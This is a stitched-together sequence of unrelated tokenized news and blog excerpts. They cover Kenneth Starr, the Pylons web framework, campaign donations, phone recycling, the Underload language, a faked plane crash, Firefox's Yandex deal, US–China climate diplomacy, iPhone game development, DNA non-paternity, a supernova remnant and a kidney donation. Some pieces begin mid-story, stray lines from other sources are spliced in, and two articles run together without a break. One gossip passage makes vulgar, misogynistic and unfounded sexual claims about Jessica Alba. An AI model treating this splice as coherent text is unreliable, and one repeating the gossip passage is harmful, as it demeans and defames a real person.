Starr will serve as lead counsel and argue their case to the Supreme Court .
Starr , the dean of Pepperdine Law School , investigated the suicide of Clinton deputy White House counsel Vince Foster and the Whitewater affair .
The $ 70 million investigation turned up evidence of President Clinton 's affair with Monica Lewinsky and led to Clinton 's impeachment by the House of Representatives .
He was acquitted by the Senate .

What Makes Pylons Stand Out As a Web Framework
After 6 release candidates , Pylons 0.9.7 final has been released .
Big congrats to all developers .
Although it 's just a point release , I think this is a huge milestone for Pylons for one reason :
It has proper documentation !
I 've been using both Pylons and Django for several web applications and Pylons ' old docs were sparse and hard to navigate .
This did n't stop me from digging in and playing around with the framework but for a project to really reach a wide audience it needs well - organized , readable documentation .
I can think of many well designed , solid programming tools that have failed because , simply , their docs were not readable .
There is a difference between having comprehensive documentation and having documentation that is readable .
Django got this right from day one .
As a Pylons user , I 'd like to point out a few reasons why I like it and some reasons I do n't .
It 's not meant as a fair comparison to Django , but Django is the only other web framework I know pretty well so it is my point of reference .
Likes :
It 's a " hacker 's " framework .
When you install it , Pylons generates just enough code to expose its operational mechanisms but not too much code to make upgrading hard .
In other words , the core of Pylons is in the pylons module yet all that initialization and request handling code is exposed to you in your own application .
Pylons is just a wrapper around lots of other modules maintained by the community .
Just like Python itself ;)
This is an advantage to me because the PyPI has a lot of neat stuff and it's easier to create , test , and maintain a small component that does one thing well than it is to fit that into a large framework that does everything .
In the critique I 've seen of this feature , I think mostly it was due to a misunderstanding of the setuptools module ( and easy_install script ) , which provides utilities for handling large amounts of dependencies .
There is already a nice alternative to easy_install which allows for flat installation of dependencies ( no egg directories ) and more , called pip .
Wrapping up lots of other powerful tools makes for a powerful web framework .
Here are just a few of what I think are excellent add - ons to Pylons ( or any web framework ) :
Paste ( especially the _debug view ; Django should steal that :) )
WebOb WebTest WebError SQLAlchemy Nose Fixture
WSGI Middleware
At some point in the past I might have marked this as a dislike .
WSGI is hard to understand .
Admit it , it will make your brain bleed !
But once you get it , it is very clever .
I have written a lot of custom middleware to do things like intercept URLs to stub out web services , add static file handling for development , and provide custom error handling .
Most of Pylons is implemented as middleware so you can literally strip it down to the core if you need extra speed and simplicity .
Also , WebOb provides utilities that make WSGI simpler to implement .
Dislikes :
Short variable names and from yourapp.lib.base *.
UPDATE : I just found out the import * and short variable names c and g are no longer the defaults in 0.9.7 .
: I just found out the import * and short variable names c and g are no longer the defaults in 0.9.7 .
Sharing applications ?
I admit I have n't tried to share applications in a Pylons app the way I have in Django .
I suppose this can be done in Pylons simply with middleware ?
Anyway , Django seems to have thought about this problem a little more and makes it easy to " glue together " multiple applications so that their URL spaces can merge effectively .
Routes I do n't like Rails - style routes , the default dispatching middleware for Pylons .
I much prefer Django 's URL patterns which are more pythonic .
OK !
I guess that means I need to write a Django - style URL middleware :)
Obviously it does n't bother me too much because I have not written my own .
UPDATE : In the comments , L.C. Rees posted a link middleware that does this : urlrelay .
Cool !
As a disclaimer I should point out that I am one of those developers who likes to build low level tools .
I certainly reuse existing components when possible but building small tools that do one thing and do it well is fun because it 's easy .
Pylons fosters this approach to software .
Not all developers are like this and I 'd say , overall , Django probably offers more of a " batteries included " feeling .

McCain took $ 28 k from fraud suspect
Ken Vogel reported Wednesday that Dems got the majority of the $ 2.4 million shmeared on American politics by financier R. Allen Stanford , who is accused of perpetrating an $ 8 billion fraud .
The Center for Responsive Politics fills in some of the blanks , namely that Sen. John McCain , who has campaigned against dirty money in politics for years , was one of Stanford 's favorite Republicans — with Stanford contributing $ 28,150 to the former GOP presidential nominee .
Other big recipients were Sen. Bill Nelson ( D - Fla. ) , who snagged $ 45,900 , and NRCC Chairman Pete Sessions ( R - Texas ) , who raked in $ 41,375 from the Houston billionaire .
Let the refunds / charitable contributions begin !
An interesting detail : Stanford 's firm spent $ 4.8 million on lobbying federal lawmakers since 1999 — $ 2.2 million in the past year .

How an old phone can make money
As well as making money people are helping others and the environment
It is unlikely that the global recession has completely dampened people 's enthusiasm for new gadgets this Christmas .
But for cash - strapped consumers with a shiny new mobile in their hands , there is a way of making money from their old , unwanted handsets .
According to mobile phone trade - in website FoneBank , only 20 % of UK consumers are recycling their mobiles but those that do can recycle their old mobiles for cash .
A survey it conducted to find out what people did with their mobile found that 28 % put them away in a drawer while 23 % simply threw them away .
" It 's crazy that a lot of people out there are still just chucking their phones in the bin when they no longer have any use for them , " said Mark Harrison , director of Fonebank .
In November Fonebank recycled 10,000 mobiles
The need to recycle electronic devices such as phones , PDAs and digital music players is more than just a financial one as many contain materials that can be harmful to the environment .
The main problem lies with the batteries used to power the phones , some of which contain toxic substances such as cadmium , which can contaminate the water table .
Mobile phones now come under the WEEE directive , a piece of European legislation which aims to reduce the amount of electronic waste that ends up in landfill sites .
It requires member nations to collect and recycle the equivalent of 4 kg of e-waste for every person living in the country .
Manufacturers , importers and retailers of electronic equipment are obliged to put systems in place that allow customers to recycle their obsolete devices free of charge although households are under no obligation .
Fonebank recycled around 10,000 phones in November , the majority of which are earmarked for Africa , Pakistan , India and South East Asia .
" It is a lot more difficult to buy a brand new phone in Africa and they are prohibitively expensive , so a good , second - hand phone is very attractive , " said Ollie Tagg , director of Fonebank .
Right thing During November Fonebank sent out £ 200,000 worth of cheques , with an average per person of £ 50 , although an iPhone can raise much more .
" One of the most popular ones traded in during October was Nokia 's N95 which can raise £ 102 for the owner , " said Mr Tagg .
" People recycling their phones make a bit of money and feel they are doing the right thing .
The whole process takes three minutes online and then they just have to stick their phone in a jiffy bag , " he added .
This year Fonebank has teamed up with Oxfam to donate a minimum of 10 % of the value of the phone to aid the charity 's work in the developing world .
Other charities , including Age Concern and the British Red Cross , are also offering people the chance to donate phones .
During December some six million handsets will have been exchanged .
And for those who really can't be bothered to post off their old handset there are other ways of recycling them .
" I have spent literally hundreds over the years on toys for my kids but the thing they 've liked the most are old mobiles , particularly ones that flip and flash , " one respondent to the FoneBank survey revealed .

Overview
Underload is a Turing - complete stack based programming language .
Elements on the stack are of variable length and manipulated by a set of eight instructions .
Instruction set
Instruction Description ~ exchange the top two elements : duplicate the top element !
discard the top element * concatenate the top element to the end of the second element a enclose the top element in parentheses S output the top element then discard it ^ remove the top element then execute it ( ) add a new element containing everything between the parentheses
Example Programs
Hello , World !
A simple program to demonstrate output in Underload :
( Hello , World ! )
S
First ( Hello , World ! ) adds a new element containing “ Hello , World ! ” to the stack .
Next , S displays and discards the element .
Quine
A quine is a program which outputs its own source code :
(: aSS ) : aSS
First ( : aSS ) adds a new element containing “ : aSS ” to the stack :
: aSS
Then : duplicates the top element .
The new top element is to the right :
: aSS :aSS
Next a encloses the top element in parentheses :
: aSS ( : aSS )
Finally SS will display and discard the top two elements .

We 're sad that this accident occurred and we consider ourselves fortunate that our driver was not injured .
A US businessman facing financial problems has apparently faked his own death by bailing out of his plane and letting it crash in a Florida swamp .
A rescue operation was launched when Marcus Schrenker made a distress call saying his plane 's windscreen had imploded and he was bleeding .
Mr Schrenker , 38 , is still missing , but thought to be alive and well .
His financial management companies are reportedly under investigation and he owes $ 500,000 to an insurance company .
Police think the financial adviser may have parachuted from the plane before it crashed .
Running for the woods Mr Schrenker was the only person aboard the single engine Piper plane that took off for Florida on Sunday from Anderson , Indiana .
When the authorities received a distress call from the pilot as he flew over Alabama , a rescue operation was launched .
Two military planes were scrambled and they found Mr Schrenker 's plane flying on autopilot , with its door open and no sign of the pilot .
The plane then crashed in a swampy area near Milton , Florida , close to several homes .
But investigators said the wreckage showed no signs of blood or a smashed windshield .
The sheriff 's office in Santa Rosa County - where the plane crashed - said the pilot appeared to have intentionally abandoned his plane .
Marcus Schrenker 's businesses have been under investigation A man with Mr Schrenker 's identification apparently checked into a hotel in Alabama after the crash , telling police he had been in a canoeing accident , before being seen running away into nearby woods .
It emerged on Tuesday that the Indiana Department of Insurance filed a complaint against Mr Schrenker last January on behalf of seven investors who claimed he cost them more than $ 250,000 ( £ 172,000 ) because he never told them they would face high fees to switch annuities .
A hearing in the case was scheduled for next week .
On Tuesday , prosecutors alleged that Mr Schrenker had been advising clients even though his license had expired on 31 December .
A judge ordered him arrested on financial fraud charges .
Authorities in Indiana have been probing Mr Schrenker 's financial management businesses - Heritage Wealth Management Inc , Heritage Insurance Services Inc and Icon Wealth Management - for possible securities violations , said Jim Gavin , spokesman for Indiana 's secretary of state .
Judgement issued Officers searched Mr Schrenker 's home on 31 December looking for computers , notes , photographs and other documents related to those companies , said Mr Gavin .
On Friday , two days before the crash , a federal judge in Maryland issued a $ 533,500 ( £ 367,000 ) judgment against Heritage Wealth Management Inc , in favour of a life insurance company .
The lawsuit said there had been problems with insurance or annuity plans sold by Heritage Wealth Management .
The case took another turn on Tuesday when investigators said it looked like Mr Schrenker had stashed a red motorcycle in an Alabama storage unit before the crash , then retrieved it and fled .
" He could be anywhere at all , " said Harpersville Police Chief David Latimer .
" Within 10 hours he could be in New Orleans , halfway to Houston , in Atlanta , anywhere .
I believe he 's out of the US .
" He jumped out an airplane and left it to crash who knows where .
He has shown a total disregard for human life .
I think he would do anything to get away . "
Investigators believe Mr Schrenker 's plan was to let the plane crash into the Gulf of Mexico , Mr Latimer said , but the plane ran out of fuel first .

If you have a booking with us and are concerned about the impact of the current situation on it
Firefox will reportedly drop Google search as the default search engine in favor of Russian - based Yandex in official Russian builds of version 3.1 .
According to Mozilla General Counsel Harvey Anderson , the reason behind the change was a study of Russian user behavior conducted by Mozilla that concluded that Russian users wanted direct access to Yandex more than they did Google .
That ’s not overly surprising , since in Russia Yandex controls the search market at about 43 - 45 % of all searches .
As we reported in September , there are just five countries globally that Google does n’t currently dominate — Russia being one of them .
Interestingly , though , among those five countries , Google is actually competing at the highest level in Russia , where they have about 35 % of all searches and have actually grown their share of the market by about 6 points over the past year .
Losing default status on Firefox will be a pretty serious blow to Google in terms of competing in Russia .
Just over 21 % of Russian Internet users browse the web using Firefox , and about 17 % using Firefox 3 — which means Firefox 3 has upped general Firefox usage in the country by about 5 - 6 % since being introduced , according to LiveInternet .ru statistics .
Last April , just about 15 % of the population used Firefox .
We wrote last month that Mozilla ’s relationship with Google has become increasingly complicated since Google released their Chrome web browser .
It ’s not clear what , if any , cash has changed hands by switching to Yandex as a default search engine , but because Google accounts for about 88 % of Mozilla ’s revenue ( via a search advertising deal ) , it would make sense for Mozilla to start seeking alternative sources of revenue .
We ’ve predicted that Firefox might suffer once Chrome matures , so seeking new revenue streams is a good idea for Mozilla .
If Google ca n’t be relied upon as much for support , Mozilla will need to start forging partnerships elsewhere .
Though Anderson said the reason for the change was a user study , we suspect that at least part of the motivation for the switch to Yandex was a tit - for - tat reaction from Mozilla to Chrome .
There is no real indication of that , however , so it ’s a hunch on our part .
Russia is a good place for Mozilla to start seeking alternative revenue partners given that Firefox both is popular and Google is not the dominant search engine — that ’s not a common dual occurrence .
As Hillary Clinton arrives in Beijing today , following her stops in Japan , Indonesia and South Korea , she will be well aware that the Obama administration 's relations with China did not get off to a good start .
Beijing regards Barack Obama as an unknown quantity who , the Chinese suspect , is inclined both to defer to his party 's protectionist instincts and to raise China 's human rights record to uncomfortable public prominence .
George W Bush 's presidency , on the other hand , was a pleasure for Beijing to deal with : it distracted itself with two unwinnable wars , leaving China to expand its influence , quietly contrasting Beijing 's peaceful international profile with the US 's embattled one .
By playing the bad boy in international climate politics , the Bush administration eased the pressure on China to do more about its own soaring emissions .
And in the most active and important aspect of Bush 's China policy , the strategic economic dialogue , set up in 2006 to strengthen ties , the US depended on China first to soak up US debt and then to help manage the consequences of the crisis .
Bush 's treasury secretary Henry Paulson made more than 70 trips to China and , in between , there were frequent phone calls .
" People have no idea how closely we co-operated with China on the economy and terrorism , " said one Washington insider last week .
In nearly two years of Obama campaigning , on the other hand , China was hardly mentioned .
When Timothy Geithner , Obama 's new treasury secretary , accused Beijing of currency manipulation last month , it took a phone call from Obama to Hu Jintao to thaw the resulting frost .
It was not the most adroit start to this new phase of the world 's most important bilateral relationship and there was much at stake : not only is China 's economic co-operation necessary , but , if catastrophic climate change is to be avoided , joint action by the two countries that together produce half the world 's greenhouse gas emissions is essential .
A week ago , on the eve of her departure for Asia , Clinton delivered her first major policy speech , appropriately enough , to an invited audience in the Asia Society in New York .
For the first time in US history , the new secretary of state 's first outing was not to be across the Atlantic but across the Pacific , a strong signal that the new administration shares Asia 's sense of its current and future importance .
For Clinton personally , an early trip was necessary to build her profile .
She faced the delicate business of re-balancing the political and the economic relationship with China , despite the fact that the economic crisis continues to dominate both capitals .
Clinton has relatively little room for manoeuvre : the economic relationship must stay on course and that dialogue belongs to the US treasury department .
The military dialogue , suspended last November , will shortly resume ; diplomatically , the US will continue to need China to keep North Korea in line in the six party talks ; cross-straits relationships with Taiwan are stable and improving .
The US will continue to rely on Japan as its strategic ally in the region and China will continue to resent it .
None of this will change .
There is , though , one area in which Clinton can draw a clear line between the Bush administration 's China policy and the new " smart power " approach : on climate change , the road is clear for an accelerated co-operation between the world 's two biggest emitters that could stimulate a radical , global transformation to low carbon development .
In her speech on Friday , Clinton acknowledged the Asia Society 's Orville Schell , who has led a team that , with the Pew Centre on Global Climate Change , spent much of last year working on a road map for US - China co-operation on climate policy and technology .
It is one of several informal diplomatic initiatives that have been developed in anticipation of regime change in Washington and which are now vying for the new administration 's endorsement .
The group 's report , released last week , argues that the US and China should use the synergies in their economies to work together on the development of low carbon technologies , especially - for these coal - dependent giants - in carbon capture and storage .
Other technical collaboration should include energy efficiency and renewable technologies , advanced electrical grids and data collection , and they pressed for a joint high - level taskforce to be established to take the collaboration forward .
The devil may be in the detail , but Clinton left her audience with the impression that she , and the US 's new special envoy on climate change , Todd Stern , were ready to explore these ideas with China .
There is a high risk that efforts to reach a global deal on climate in Copenhagen this December will fail , given the tight timetable , and if that happens , the laggard United States would have contributed to that failure .
Rapid bilateral deals on the climate with China , though , are easier to implement than a complex international treaty that would need ratification by a still obdurate congress .
The US under Obama will stay in the Copenhagen talks , but the US - China forum may be where the action really happens .

I have this theory that Jessica Alba could n’t deal with the rejection of being ditched by Cash Warren back when he escaped her crazy , so she tricked him into knocking her up .
Whether she poked holes in the condom , or ran to find the used condom and inserted it inside out are details we ’ll never know , but despite his efforts to no get her pregnant , he failed and she won .
The only issue is that now that the baby has come , it means a lot of fucking responsibility that this cunt was n’t ready for so she pawned it off on her staff and mother and a couple of wet nurses and the proof of this theory are her deflated titties , there ’s no way a milkin mom would be this flat unless she sprung a leak .
I know some of you are fans , so here are her pics from God knows where , but I assume something that has to do with Oscar because like an annoying relative visiting from out of town , they takeover Hollywood and do n’t know how to fuck off .

Jessica Alba and Her Deflated Mom Tits of the Day

The developer of iShoot quit his day job after earning $ 22,000 a day at the top of the App Store charts .
Here 's what you have to do to be next ...
You 've probably heard all about iShoot .
Written by a programmer at Sun Microsystems in his spare time , this Worms - style artillery shooter blasted to the top of the App Store charts earlier this year and stayed there for weeks earning its creator enough money to pack in his day job and become a professional developer .
You may also have seen the news this week about nine - year - old programming prodigy Lim Ding Wen who has developed his own simple painting app for the iPhone .
Doodle Kids is doing reasonable business , attracting 4,000 downloads in less than a fortnight and gaining its author international news coverage .
There 's no question about it , iPhone has become the people 's platform .
While the PC maintains a healthy indie development scene , Apple 's handset , with its low barriers to entry and seamless consumer purchasing system , is the real rags - to - riches machine .
In practically a month , you can develop an application that will be available to a global market of enthusiastic downloaders .
Publishers ?
Distribution partners ?
Specialist development hardware ?
None of it is necessary .
In the same way that cheap , accessible digital technology has brought film and music making to the masses , iPhone seems to have sliced through the painstaking game production pipeline .
Everyone can be Will Wright now .
Or can they ?
How exactly do you go about creating an iPhone title ?
I 've spoken to iShoot coder Ethan Nicholas and two British studios involved in iPhone development - FluidPixel , responsible for fun Lemmings - style platformer , KamiCrazy and Connect2 Media 's Manchester team , currently finishing off the hugely promising , Go! Go! Rescue Squad .
Here are their tips to any burgeoning app stars …
1. Buy a Mac
You 'll need one with an Intel - based processor , running the Leopard version of MacOS X .
It does n't have to be a top of the range model , though .
Ethan Nicholas wrote iShoot on a banged - up old MacBook with 1GB of memory , knackered Wi-Fi and an Ethernet port that needed to be wiggled around to get it to work .
The machine did however , afford him the manoeuvreability he needed : " most of my available development time involved holding a baby on the couch so my laptop was better suited to the task . "
Peter Scott , CTO at Connect2 Media suggests Mac Minis , " they are more than powerful enough , small , easy on desk space when you already have PCs , three LCD monitors and a bunch of devices .
They are also easy to move round , developers can take them home at the weekend if they want to continue to work . "
2. Down the SDK ( software development kit )
" Apple provides the free SDK for iPhone development from their Developer site , " explains Stuart Varrall , Creative Director at Fluid Pixel .
" This includes everything you need to get going , including the development environment Xcode , the iPhone Simulator for testing , performance analysers , interface builders and the full documentation reference library . "
3. Learn Objective C
This is the primary programming language for iPhone development .
" It 's an extension of C to include object - orientated principles , " says Varrall .
" It has scripting elements to it , so is easier to pick up than some languages and anyone with programming experience should be able to transfer their skills . "
" Here 's a short history of Objective C , " offers Scott , " It was born out of Smalltalk which was a very early Object Oriented Programming language developed in Xerox PARC ( where Window / Mouse computing really begun ) and as a consequence was heavily adopted by Apple since as early as the Lisa .
Smalltalk is very similar to C. "
" Objective C was actually created by Next Computing owned by a certain Steven Jobs .
When Jobs returned to Apple , he sold Next to the company and so Objective C became the main development environment for the Apple Mac .
It is liked because in similar ways to Java , it deals with many of the problematic parts of programming ….
It 's nice , simple , hides the complexities of the hardware away from the developer and deals with ( on the whole ) the major cause of programming issues in C and C++ which is memory leaks . "
Go !
Go! Rescue Squad : written in C++ , but Objective C is fine for iPhone - only projects .
All well and good , but what 's the best way to actually pick up the language ?
" This really depends on where you are starting from , " explains Scott .
" If you are proficient in C / C+ + or Objective C then the learning curve is in getting to grips with the APIs of the iPhone - the best place to start is the iPhone developer site .
If you need to learn the programming languages themselves then the best place to start is a beginners book , actually the For Dummies series is very good for this .
Also look at one of the many free tutorials online - Googleing ' objective C tutorial ' throws up many places to get these . "
" The official Apple SDK has a wealth of detail along with examples of implementing various features , " adds Varrall .
" The Apple developer forum is rapidly growing to be the best place for specific questions or to get further clarification on something " .
He also mentions that iPhone supports Open GL ES which allows heavy optimisation when working in 3D .
So if you 're thinking beyond a scrolling shooter or Tetirs clone , you 'll need to look into that as well .
Also , many professional studios write their games in C++ rather than Objective C , especially if they 're planning to port the code onto other platforms such as N - Gage of Xbox Live Arcade .
4. Start writing something !
Forget theory ; forget mastering Objective C with your first attempt .
Just set yourself a project and start working .
" I knew nothing about Objective C , Cocoa , or OpenGL prior to starting iShoot .
In fact I barely even knew C , " admits Ethan Nicholas .
" I had n't really touched it in a decade .
I was a Java programmer for twelve years and it was quite an adjustment moving from a nice safe language like Java to one where a single misplaced byte can instantly crash your program . "
Nicholas ' first aim – and this is more or less standard procedure in the development community when presented with a new platform – was to get something to appear on the screen .
" The first thing I worked on was the ground .
I wanted to create a destructible landscape with falling dirt .
Since I had no idea how to load textures at that point , and had just grasped the basics of Objective C and OpenGL , my dirt " texture " was just solid white .
So the first thing I got onscreen was just a white rectangle that represented the ground .
My wife was fortunately tolerant enough to understand my excitement at getting anything , even just a simple white rectangle , on the screen .
" By day two , my featureless white rectangle had morphed into a properly textured landscape and most of the dirt - descruction code was working .
By the end of the first week I had a tank on the screen firing shots randomly , blowing holes in the ground .
When I finally got it on to an actual phone and not just the simulator , I found that it only ran at one frame per second , so I had some considerable optimisation work ahead of me . "
If you can't face starting out on an original project , however , Varrall suggests a couple of modification tasks .
" The SDK actually comes with a whole host of sample projects that cover most aspects of development .
So the best place to start would be to take one of those and reverse engineer it and work out how it has been constructed .
You can then build on these by adding new features and create your very own game very quickly . "
5. Sign - up as an official developer
If you plan on releasing your masterpiece at any point , you 'll need to sign up with the iPhone Developer Program .
The Standard cost is $ 99 , and it involves agreeing to Apple 's terms and conditions , and signing and returning the contract .
Even if you 're nowhere near completing the project , you 'll need to sign up in order to test your code on an actual iPhone rather than an onscreen emulator .
Once you 're on the Developer Program you 're sent a certficate , which allows you to pair up with an iPhone device .
6 . Prepare for a few weeks of work …
Depending on the time available , and your level of programming knowledge , developing an iPhone game can mean as little as a couple of months ' work .
" Including learning Objective C , Cocoa , and OpenGL , I spent exactly six weeks on iShoot , " says Nicholas .
" The hardest part was adjusting to an unsafe language ... after twelve years working in Java , it 's very difficult to get back into the proper mindset for debugging crashes .
I had one memory corruption issue where it turned out that literally only a single byte was being corrupted , and it did n't cause the program to crash until several minutes after the corruption occurred .
It took me three days to find that one … "
KamiCrazy : six weeks to develop with a team of five ...
The professional studios I spoke to provided similar timeframes , though they involved teams rather than lone coders .
" KamiCrazy took three months to develop part - time , so could be done in a month full - time , " reckons Varrall , who used three programmers , one artist and a producer .
" The programming was focussed on the most part into making the robust engine that drives the game and included the level editor , allowing the levels to implemented with ease .
This means that this technology can be re-used and future titles could be turned around in less time .
The art took three weeks in total to produce . "
7. Submit your app to Apple
Okay , this is the big one .
" Finished games have to be submitted to the App Store using the same interface as music producers use , " explains Varrall .
" It 's a straightforward process of zipping up the file , uploading it with a description , a large and small icon , and screenshots .
If everything is alright then it usually takes Apple a week to approve the content and it finds itself in the store .
If there is a problem , such as obvious bugs or Lite apps that are mentioned as demos or are n't fully featured , then this can take longer to review and ultimately reject .
In this instance you can fix the issue and resubmit as many times as you like . "
" Any iPhone developer will tell you that the provisioning and code signing is a pain , but once I had that sorted out the submission process was trivial , " agrees Nicholas .
" Fill in the fields , wait a few days , eagerly anticipate your first sales report ... and then watch everybody completely ignore your app as you sell fewer than 20 copies a day .
i Shoot was n't exactly a resounding success in the beginning … "
8. Adapt , market and survive !
The work does n't finish once you 've made it onto App Store .
As it 's unlikely you 'll have your own in - house QA department , some bugs and design issues may only surface when hundreds of gamers get their hands on the code .
Consequently , it may be necessary to submit several alterations .
And as Nicholas mentioned , do n't expect an immediate response to the release – App Store is an open market , featuring around 20,000 applications and 2,000 games .
To get noticed , you 'll need to build a buzz around the game : engage with the development and gaming communities , start a blog about the programming process , produce screenshots and mail out press releases to iPhone news sites like Pocket Gamer , Touch Arcade and FingerGaming .
And , of course , utilise social networking sites like Twitter , Facebook and Bebo .
The iShoot profit graph : releasing the Lite version had a reasonably dramatic effect on sales of the original ...
Or just produce a free demo version .
i Shoot was widely ignored for several weeks before Nicholas decided to produce a cut - down ' Lite ' version which he made available for free .
" it quickly became the # 1 free application , and iShoot sales followed suit .
Here is an actual graph of my daily sales from iShoot 's launch through to when it became number one .
To put things in perspective , you see the biggest spike before iShoot Lite was released ?
That tiny little bump ?
That was Christmas Day , when I made over $ 500 in a single day .
I was quite excited about that at the time . "
While at the top of the Paid Apps chart , iShoot was getting over 10,000 downloads a day , at $ 2.99 each .
Take out Apple 's standard 30 % commission and Nicholas was pulling in $ 21,000 a day .
He quit his job at Sun and is now working on a new game ( " My next project involves airborne sheep , but I 'm afraid that 's all I can share at the moment " ) .
You could be next ….

In a search for their ancestors , more than 140 people with variations of the last name Kincaid have taken DNA tests and shared their results on the Internet .
They have found war heroes , sailors and survivors of the Irish potato famine .
They have also stumbled upon bastards , liars and two - timers .
Much of it is ancient history , long - dead ancestors whose dalliances are part of the intrigue of amateur genealogy .
But sometimes the findings strike closer to home .

In one case , two brothers were surprised to discover they had different fathers .
They confronted their elderly mother , who denied the most obvious possibilities -- that she had been unfaithful to her husband , the man they had always known as Dad , or that one son was adopted .
“ It has been traumatic for some to discover their true lineage through the DNA tests , ” said Don Kincaid , a 76 - year - old Texan who oversees the Kincaid surname project and witnessed the brothers ’ ordeal .
As genetic testing becomes more widespread for medical information , forensics and ancestral research , more people are accidentally uncovering family secrets .
Among the most painful are so - called “ non-paternity events , ” cases in which Dad turns out to be someone else .
“ It ’s going to be more and more of a problem , ” said Dr. Eric Topol , chief of genomic medicine at Scripps Research Institute in La Jolla .
Increasing numbers of people will be asking their spouses and parents : “ What happened 25 years ago ? ”

The direct - to - consumer DNA industry sometimes warns customers of the possibility of unintended consequences .
But company involvement stops there .
The two Kincaid brothers declined through a spokesman to talk about their experience , calling it too painful .
Others , with the benefit of genetic distance , are more philosophical .
“ I ’m sure in the history of the Kinkaide family , there ’s been some fooling around , ” said 66 - year - old Perry Kinkaide .

Values and behavior
How many of us are not our fathers ’ children ?

The question has fascinated researchers as a window into the gap between a society ’s stated values and its behavior .
A 2005 analysis of 17 studies -- based on blood and DNA tests of various groups -- concluded that the answer varies depending on country and culture .
But the average rate is 4 % .
The issue has long lurked in the background of medicine .
It ’s not hard to figure out if your blood type is compatible with Mom ’s and Dad’s ( If they are both A positive and you are B positive , you have a problem . )
A recent survey of 56 kidney transplant centers by the University of Maryland showed that 70 % had stumbled upon at least one case of non-paternity as a result of testing potential organ donors .
DNA testing has opened the gates of possibility .
The potential for surprises exists whenever members of the same family are tested .

For example , researchers looking for the genetic fingerprints of certain diseases have long compared child and parent DNA .
Every so often , mismatches pop up that raise the possibility of hanky - panky .
In research , subjects have signed waivers agreeing that discoveries of non-paternity will not be revealed to them or anybody else .
But in medical practice , the truth has a way of cruelly asserting itself .

In the most common scenario , a child is born with Tay - Sachs disease , cystic fibrosis or another disorder that requires the contribution of a certain gene from each parent .
The parents are tested , and the father is found not to carry the gene .
Breaking the news falls to genetic counselors , who often must balance competing ethical imperatives .
“ Non-paternity is one of the issues that genetic counselors dread but at some point in their careers will have to deal with , ” said Andrea Atherton , a counselor at Children ’s Mercy Hospital in Kansas City , Mo .
Standard practice is to tell only the mother , who usually already suspects it , genetic counselors say .

Ana Morales , a genetic counselor at the University of Miami , recalled the case of a child diagnosed with a type of albinism that can be accompanied by lung and kidney disease .
The mother “ told me she was having an affair , ” Morales said .
“ She said she would be in physical danger [ if her husband found out ] .
He had threatened her if she was unfaithful . ”
Morales did not tell him .

But withholding the information means that the woman ’s husband lives with the false belief that he is a carrier of a genetic disorder .
That sort of information is far from benign , said Dr. Wayne Grody , a UCLA geneticist .
It could convince him to give up on the idea of having children .
And in the event that the wife becomes pregnant by her husband , perpetuating the lie could require unnecessary prenatal testing .
“ Why would you expose the next fetus to the risk of amniocentesis ? ” Grody asked .
In the growing world of direct - to - consumer DNA testing , customers are usually on their own to discover and digest non-paternity .

The industry has ballooned to more than three dozen companies from its inception about nine years ago .
There is a wide range , from those that offer basic ancestry testing to a few that scan several hundred thousand genes looking for susceptibility to certain diseases .
Scans , which require a cheek swab or a vial of saliva , cost $ 100 to $ 1,000 .
23 andme , a year - old company that mines genomes for medical information , warns customers in a consent form that testing could reveal that “ your father is not genetically your father . ”
Advertisement
The company allows customers to display vast swaths of their DNA next to that of relatives -- with everyone ’s consent -- making cases of non-paternity easy to spot , geneticists say .
Rachel Cohen , a spokeswoman , said she is not aware of any such cases , though the company does not look for them or necessarily hear about them from customers .

Y chromosomes
Advertisement
In ancestry testing , non-paternity shows up most often in comparisons of Y chromosomes , passed from father to son .
( Some companies also test mitochondrial DNA , which everybody inherits from their mothers , but it is less useful in genealogy because surnames are usually passed down the male line .
Women often submit the Y - DNA of a close male relative . )
All the males in a single bloodline have the same Y - chromosome , except for the tiny mutations that accumulate over generations .
If a father and son have vastly different Y - chromosomes , they are not related .
If cousins have dramatically different Y - chromosomes , it is safe to conclude that somewhere along the line that joins them , someone is keeping a secret .
Advertisement
And if the Y - chromosome looks nothing like those of the other people with the same last name who have posted theirs on the Internet , it is fair to wonder whether somebody is hiding something .
Of the 147 people in the Kincaid project , most fall into four main groups of Y - DNA .
But about 10 Kincaids did n’t match up with anybody else .
“ You can let your mind run wild , ” said Bob Kinkaid , 68 , from Star Tannery , Va. , who did n’t find any Kincaids with Y - DNA similar to his .
“ You never know when a male child may have been adopted , ” he offered .

Perry Kinkaide , who lives in Edmonton , Canada , said that after two decades of tracing his family ’s paper trail , he thought he knew many of his ancestors .
Then he sent in a DNA sample .
The results suggest that he was n’t biologically related to the people he had been studying -- not that it bothered him .
Any indiscretions probably happened at least a few generations back , he guessed .
“ I looked like my father , ” he said .
“ We even had the same walk . ”

Don Severs , a 47 - year - old data manager from Des Moines , Iowa , said DNA helped him confirm that his great - great - grandfather , William Severs , born in 1815 , was not a Severs at all .
William Severs ’ biological father was a postmaster named George Kinkade , and his mother the family ’s housekeeper .
When she became pregnant , the family arranged for her to marry a Severs .
The secret probably saved his mother and the Kinkades from scandal .
Don Severs , who has the Y - DNA of the Kincaid clan , wonders if anybody would go through such pains today .

“ Now illegitimacy is no big deal , ” he said .

Simeis 147 is a supernova remnant spanning over 3 degrees of the sky .
It 's estimated to lie about 3000 light years from Earth , have an approximate diameter of 165 light years across , and an expansion rate of nearly 600 miles per second .
The violent stellar explosion that created this object occurred about 30,000 years ago , leaving behind beautiful wisps of material and a pulsar designated PSR J0538+2817 .
Simeis 147 is an extremely faint object that requires long integration times with a CCD camera to show much of any detail at all .
( CNN ) --
In what is being heralded as a " first - ever procedure , " surgeons removed a healthy kidney through a donor 's vagina , the Johns Hopkins Medical Center has announced .
Jennifer Gilbert , center , received a kidney from Kimberly Johnson , at right in green .
Although the procedure has been previously done to extract cancerous and nonfunctioning kidneys that threatened a patient 's health , the January 29 surgery was the first time it was done for donation purposes , the center said in a news release issued Monday .
" The kidney was successfully removed and transplanted into the donor 's niece , and both patients are doing fine , " Dr. Robert Montgomery , chief of transplant surgery at Johns Hopkins , said in the release .
The surgery is considered less invasive and could pave the way for an increase in organ donations , it added .
" Removing the kidney through a natural opening should hasten the patient 's recovery and provide a better cosmetic result , " Montgomery said .
He told CNN on Tuesday , " We want to make it easier for people to donate , to have less impact on their lives , [ be ] in hospital a shorter amount of time and get back to their lives quicker . "
Do n't Miss Extreme multiple births carry tremendous risks
The woman was chosen to be the first donor to undergo the procedure because a previous hysterectomy enabled doctors to operate without a uterus obstructing their efforts , he added .
The three - hour procedure typically allows the donor to return home within 24 hours .
The more traditional surgery requires a 5 - to 6 - inch incision through the abdominal wall and generally is followed by two or three days of hospitalization .
